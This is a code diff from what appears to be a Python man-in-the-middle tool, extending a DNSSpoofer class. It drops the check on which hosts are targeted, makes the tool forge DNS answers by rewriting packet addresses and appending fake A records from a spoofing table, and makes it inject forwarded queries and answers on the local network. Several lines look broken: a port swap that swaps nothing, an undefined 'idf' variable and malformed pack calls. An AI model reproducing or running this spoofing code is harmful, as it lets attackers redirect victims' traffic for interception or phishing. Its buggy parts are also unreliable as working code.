@@ -1446,9 +1446,9 @@ class DNSSpoofer(object):
     self.ctx.raw_source_ip = packet.ip_ip_source
     self.ctx.raw_source_mac = packet.eth_mac_source
     self.ctx.target_ip = socket.inet_ntoa(packet.ip_ip_target)
-    self.ctx.target_mac = printable_mac(self.ctx.raw_target_mac)
+    self.ctx.target_mac = raw_to_mac(self.ctx.raw_target_mac)
     self.ctx.source_ip = socket.inet_ntoa(packet.ip_ip_source)
-    self.ctx.source_mac = printable_mac(self.ctx.raw_source_mac)
+    self.ctx.source_mac = raw_to_mac(self.ctx.raw_source_mac)
     self.ctx.router_ip = self.context.router_ip
     self.ctx.router_mac = self.context.router_mac
     self.ctx.raw_router_ip = pack(
@@ -1457,17 +1457,15 @@ class DNSSpoofer(object):
     self.ctx.raw_router_mac = pack(
       "!6B", *[int(x, 16) for x in self.ctx.router_mac.split(":")]
     )
+    self.ctx.source_is_our_ip = self.ctx.source_ip == self.context.ip
+    self.ctx.target_is_our_ip = self.ctx.target_ip == self.context.ip
 
   def process_dns_packet(self, packet):
     self.init_tmp_ctx(packet)
-    if self.ctx.source_ip != "127.0.0.1" and \
-        self.context.is_valid_target((
-          self.ctx.source_ip, self.ctx.source_mac
-    )):
-      if packet.is_dns_query:
-        self.process_dns_question(packet)
-      else:
-        self.process_dns_answer(packet)
+    if packet.is_dns_query:
+      self.process_dns_question(packet)
+    else:
+      self.process_dns_answer(packet)
 
   def process_dns_question(self, dns):
     server_name = DNSData(dns).query_name.decode("utf-8")
@@ -1477,40 +1475,60 @@ class DNSSpoofer(object):
     if server_name in self.table:
       #self.inject(self.forge_response(dns, server_name))
       self.forge_response(dns, server_name)
-    else:
+    elif self.ctx.target_ip != self.context.router_ip or \
+        self.ctx.target_mac != self.context.router_mac:
       self.forward_to_router(dns)
 
   def forge_response(self, dns, server_name):
-    dns_logger.info("Forge DNS response for %s [TODO]" % server_name)
+    dns_logger.info("Forge DNS response for %s [not injected!!]" % server_name)
     ## should set IP, MAC, ports, add response and update checksum
+    dns.ip_ip_target = self.ctx.source_ip
+    dns.ip_ip_source = pack("!4B", self.context.ip)
+    dns.eth_mac_target = self.ctx.source_mac
+    dns.eth_mac_source = pack("!6B", self.context.mac)
+    data = dns.dns_data
+    data.add_records = pack(
+      "!6H", 0xc00c, 0x0001, 0x0001, 0x0000, 0x0101, 0x0004
+    ) +  pack(
+      "!4B", *map(int, self.table[server_name].split("."))
+    )
+    dns.data = data
+    if dns.is_udp:
+      dns.udp_source_port, dns.udp_source_port = \
+        dns.udp_source_port, dns.udp_source_port
+      dns.set_udp_checksum()
+    elif dns.is_tcp:
+      dns.tcp_source_port, dns.tcp_source_port = \
+        dns.tcp_source_port, dns.tcp_source_port
+      dns.set_tcp_checksum()
     return dns
 
   def forward_to_router(self, dns):
     if not self.context.router_mac:
-      dns_logger.error(
+      return dns_logger.error(
         "Could not forward DNS query! Packet lost!", color=RED
       )
-    self.forward_answer[dns.dns_trans_id] = (
-      self.ctx.raw_source_ip, self.ctx.raw_source_mac
-    )
-    if self.ctx.router_mac:
+    if dns.dns_trans_id not in self.forward_answer:
+      self.forward_answer[dns.dns_trans_id] = (
+        self.ctx.raw_source_ip, self.ctx.raw_source_mac
+      )
       dns_logger.info("Forwarding DNS query 0x%s to router." % (
         ''.join(["%02x"%i for i in dns.dns_trans_id])
       ))
       dns.eth_mac_target = self.ctx.raw_router_mac
       dns.ip_ip_target = self.ctx.raw_router_ip
-      return
       self.inject(dns)
 
   def process_dns_answer(self, dns):
     adress = self.forward_answer.get(idf, None)
     if adress is not None:
+      del self.forward_answer[idf]
       dns.ip_ip_target, dns.eth_mac_target = adress
       dns.set_udp_checksum()
-      return
       self.inject(dns)
 
   def inject(self, packet):
+    dns_logger.debug("Injected.")
     self.device_socket.send(packet.raw_data)
 
   def stop(self):
@@ -1541,11 +1559,17 @@ else:
 def checksum(packet):
   return _checksum(packet) or 0xffff
 
-def printable_ip(raw_ip):
+def raw_to_ip(raw_ip):
   return ".".join(map(str, raw_ip))
 
-def printable_mac(raw_mac):
+def raw_to_mac(raw_mac):
   return ":".join(["%02x"%(i&255)for i in raw_mac])
+
+def ip_to_raw(ip):
+  return pack("!4B", *map(int, ip.split('.')))
+
+def mac_to_raw(mac):
+  return pack("!6B", *[int(x, 16)for x in mac.split(':')])
 
 def elevate_privilege():
   os.seteuid(0)
